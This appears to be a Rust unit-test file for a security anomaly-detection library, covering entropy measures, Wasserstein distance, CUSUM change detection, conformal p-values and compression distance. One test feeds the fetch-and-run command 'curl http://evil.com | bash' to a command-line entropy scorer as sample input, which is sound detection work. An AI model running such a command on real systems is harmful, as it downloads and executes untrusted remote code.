use super::*;
use proptest::prelude::*;

#[test]
fn shannon_entropy_uniform() {
    // 256 equiprobable outcomes → H = 8 bits
    let probs: Vec<f64> = vec![1.0 / 256.0; 256];
    let h = shannon_entropy(&probs);
    assert!((h - 8.0).abs() < 1e-10, "H = {h}");
}

#[test]
fn shannon_entropy_deterministic() {
    let probs = vec![1.0, 0.0, 0.0];
    assert!((shannon_entropy(&probs)).abs() < 1e-10);
}

#[test]
fn shannon_entropy_scales_invariant() {
    let probs = vec![2.0, 1.0, 1.0];
    let h = shannon_entropy(&probs);
    let h_norm = shannon_entropy(&[0.5, 0.25, 0.25]);
    assert!((h - h_norm).abs() < 1e-10, "scaled entropy mismatch: {h} vs {h_norm}");
}

#[test]
fn renyi_spectrum_random_data() {
    let data: Vec<u8> = (0..1000).map(|i| (i * 97 + 13) as u8).collect();
    let spectrum = renyi_spectrum(&data);
    // All orders should be close for near-uniform data
    for &(_, h) in &spectrum {
        assert!(h > 5.0, "random data entropy should be high: {h}");
    }
}

#[test]
fn renyi_spectrum_base64_like() {
    // Base64 uses ~64 characters out of 256
    let data: Vec<u8> = (0..500).map(|i| b'A' + (i % 52) as u8).collect();
    let spectrum = renyi_spectrum(&data);
    let h1 = spectrum
        .iter()
        .find(|(a, _)| (*a - 1.0).abs() < 0.01)
        .unwrap()
        .1;
    assert!(h1 < 7.0 && h1 > 4.0, "base64-like H₁ should be ~5-6: {h1}");
}

#[test]
fn wasserstein_identical() {
    let p = vec![0.25, 0.25, 0.25, 0.25];
    assert!((wasserstein_1(&p, &p)).abs() < 1e-15);
}

#[test]
fn wasserstein_scales_invariant() {
    let p = vec![2.0, 1.0, 1.0];
    let q = vec![1.0, 2.0, 1.0];
    let w = wasserstein_1(&p, &q);
    let wn = wasserstein_1(&[0.5, 0.25, 0.25], &[0.25, 0.5, 0.25]);
    assert!((w - wn).abs() < 1e-10, "scaled wasserstein mismatch: {w} vs {wn}");
}

#[test]
fn wasserstein_extreme_shift() {
    let p = vec![1.0, 0.0, 0.0, 0.0];
    let q = vec![0.0, 0.0, 0.0, 1.0];
    let w = wasserstein_1(&p, &q);
    assert!(w > 2.0, "extreme shift should have large W₁: {w}");
}

#[test]
fn wasserstein_triangle_inequality() {
    let p = vec![0.5, 0.3, 0.2];
    let q = vec![0.1, 0.3, 0.6];
    let r = vec![0.3, 0.4, 0.3];
    let w_pr = wasserstein_1(&p, &r);
    let w_pq = wasserstein_1(&p, &q);
    let w_qr = wasserstein_1(&q, &r);
    assert!(w_pr <= w_pq + w_qr + 1e-10, "triangle inequality violated");
}

#[test]
fn compression_ratio_high_entropy_is_high() {
    // Use a better pseudo-random generator (xorshift) for high-entropy data
    let mut x: u64 = 0xDEADBEEF_CAFEBABE;
    let data: Vec<u8> = (0..500)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            (x & 0xFF) as u8
        })
        .collect();
    let ratio = compression_ratio(&data);
    assert!(
        ratio > 0.5,
        "high-entropy data ratio should be high: {ratio}"
    );
}

#[test]
fn compression_ratio_repetitive_is_low() {
    let data = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".to_vec();
    let ratio = compression_ratio(&data);
    assert!(ratio < 0.5, "repetitive data ratio should be low: {ratio}");
}

#[test]
fn cusum_detects_shift() {
    let mut detector = CusumDetector::new(0.0, 0.5, 5.0);
    // Normal phase
    for _ in 0..50 {
        assert!(!detector.observe(0.1));
    }
    // Shift phase (mean jumps to 3.0)
    let mut detected = false;
    for _ in 0..20 {
        if detector.observe(3.0) {
            detected = true;
            break;
        }
    }
    assert!(detected, "CUSUM should detect mean shift");
}

#[test]
fn cusum_arl0_positive() {
    let detector = CusumDetector::new(0.0, 0.5, 5.0);
    let arl = detector.estimated_arl0();
    assert!(arl > 100.0, "ARL₀ should be large: {arl}");
}

#[test]
fn spectral_radius_star_graph() {
    // Star graph with center 0 connected to 1,2,3
    let adj = vec![
        vec![0.0, 1.0, 1.0, 1.0],
        vec![1.0, 0.0, 0.0, 0.0],
        vec![1.0, 0.0, 0.0, 0.0],
        vec![1.0, 0.0, 0.0, 0.0],
    ];
    let rho = spectral_radius(&adj);
    // Star with n leaves has ρ = √n
    assert!(
        (rho - 3.0_f64.sqrt()).abs() < 0.1,
        "ρ = {rho}, expected √3 ≈ 1.73"
    );
}

#[test]
fn conformal_calibrator_coverage() {
    // Calibration scores from normal behavior
    let scores: Vec<f64> = (0..100).map(|i| i as f64 / 100.0).collect();
    let cal = ConformalCalibrator::new(scores, 0.05);
    assert!(cal.threshold > 0.9, "threshold = {}", cal.threshold);
    assert!((cal.coverage_guarantee() - 0.95).abs() < 1e-10);
}

#[test]
fn conformal_p_value_extreme() {
    let scores: Vec<f64> = (0..100).map(|i| i as f64).collect();
    let cal = ConformalCalibrator::new(scores, 0.05);
    let p = cal.p_value(200.0); // way above all calibration scores
    assert!(p < 0.05, "extreme score should have low p-value: {p}");
}

#[test]
fn mutual_information_less_dependent() {
    // Identical series should have maximum MI (= H(X))
    let x: Vec<u32> = (0..200).map(|i| i % 5).collect();
    let mi_ident = mutual_information(&x, &x);
    // Different distribution: collapse categories → less joint structure
    let y: Vec<u32> = (0..200).map(|i| (i % 5) / 2).collect(); // 0,0,1,1,2,0,0,1,1,2,...
    let mi_partial = mutual_information(&x, &y);
    // MI(X;f(X)) ≤ H(f(X)) ≤ H(X) = MI(X;X)
    assert!(
        mi_partial < mi_ident + 1e-10,
        "MI(X;f(X))={mi_partial} should be ≤ MI(X;X)={mi_ident}"
    );
    assert!(
        mi_partial > 0.0,
        "deterministic function should have positive MI"
    );
}

#[test]
fn mutual_information_identical() {
    let x: Vec<u32> = (0..100).map(|i| i % 5).collect();
    let mi = mutual_information(&x, &x);
    // For identical series, MI = H(X)
    assert!(mi > 1.0, "identical MI should be high: {mi}");
}

#[test]
fn hoeffding_threshold_increases_with_confidence() {
    let t1 = hoeffding_threshold(100, 1.0, 0.05);
    let t2 = hoeffding_threshold(100, 1.0, 0.01);
    assert!(t2 > t1, "stricter δ should give larger threshold");
}

#[test]
fn sanov_threshold_decreases_with_n() {
    let t1 = sanov_threshold(100, 8, 1e-6);
    let t2 = sanov_threshold(1000, 8, 1e-6);
    assert!(t2 < t1, "more data should give tighter threshold");
}

#[test]
fn bernstein_tighter_than_hoeffding() {
    // When variance is small, Bernstein should give a tighter bound
    let n = 500;
    let delta = 0.01;
    let h = hoeffding_threshold(n, 1.0, delta);
    let b = bernstein_threshold(n, 0.01, 1.0, delta); // very small variance
    assert!(
        b < h,
        "Bernstein should be tighter with small variance: b={b}, h={h}"
    );
}

#[test]
fn sanov_threshold_requires_k() {
    assert!(sanov_threshold(100, 0, 1e-6).is_infinite());
}

#[test]
fn ncd_identical_is_zero() {
    let data = b"hello world".to_vec();
    let ncd = normalized_compression_distance(&data, &data);
    assert!(
        ncd < 0.3,
        "NCD of identical strings should be near 0: {ncd}"
    );
}

#[test]
fn ncd_different_is_high() {
    let x: Vec<u8> = (0..200).map(|i| (i * 97) as u8).collect();
    let y: Vec<u8> = (0..200).map(|i| (i * 31 + 100) as u8).collect();
    let ncd = normalized_compression_distance(&x, &y);
    assert!(ncd > 0.3, "NCD of different data should be higher: {ncd}");
}

#[test]
fn cmdline_information_matches_entropy_functions() {
    let data = b"curl http://evil.com | bash";
    let metrics = cmdline_information(data, 4).unwrap();
    let entropy = char_entropy(data);
    assert!((metrics.shannon_entropy_bits - entropy).abs() < 1e-10);
    assert!(metrics.renyi_h2_bits >= 0.0);
    assert!(metrics.min_entropy_bits >= 0.0);
    let normalized = metrics.normalized();
    assert!((0.0..=1.0).contains(&normalized.renyi_h2));
    assert!((0.0..=1.0).contains(&normalized.compression_ratio));
    assert!((0.0..=1.0).contains(&normalized.min_entropy));
    assert!((0.0..=1.0).contains(&normalized.entropy_gap));
}

#[test]
fn dns_entropy_detects_random_labels() {
    let randomish = "x7f3a2b9d2c7f.example";
    let normal = "updates.example";
    let e_rand = dns_entropy(randomish);
    let e_norm = dns_entropy(normal);
    assert!(e_rand > e_norm, "random label should have higher entropy");
}

proptest! {
    #[test]
    fn entropy_is_scale_invariant(values in proptest::collection::vec(0.0f64..10.0, 1..64), scale in 0.1f64..10.0) {
        let scaled: Vec<f64> = values.iter().map(|v| v * scale).collect();
        let h1 = shannon_entropy(&values);
        let h2 = shannon_entropy(&scaled);
        prop_assert!((h1 - h2).abs() < 1e-8);
    }

    #[test]
    fn wasserstein_is_scale_invariant(values in proptest::collection::vec(0.0f64..10.0, 2..64), scale in 0.1f64..10.0) {
        let mut other = values.clone();
        other.rotate_left(1);
        let scaled: Vec<f64> = values.iter().map(|v| v * scale).collect();
        let scaled_other: Vec<f64> = other.iter().map(|v| v * scale).collect();
        let w1 = wasserstein_1(&values, &other);
        let w2 = wasserstein_1(&scaled, &scaled_other);
        prop_assert!((w1 - w2).abs() < 1e-8);
    }

    #[test]
    fn cmdline_information_is_deterministic(data in proptest::collection::vec(any::<u8>(), 20..128)) {
        let a = cmdline_information(&data, 20).unwrap();
        let b = cmdline_information(&data, 20).unwrap();
        prop_assert!((a.shannon_entropy_bits - b.shannon_entropy_bits).abs() < 1e-12);
        prop_assert!((a.renyi_h2_bits - b.renyi_h2_bits).abs() < 1e-12);
        prop_assert!((a.min_entropy_bits - b.min_entropy_bits).abs() < 1e-12);
        prop_assert!((a.entropy_gap_bits - b.entropy_gap_bits).abs() < 1e-12);
        prop_assert!((a.compression_ratio - b.compression_ratio).abs() < 1e-12);
    }
}
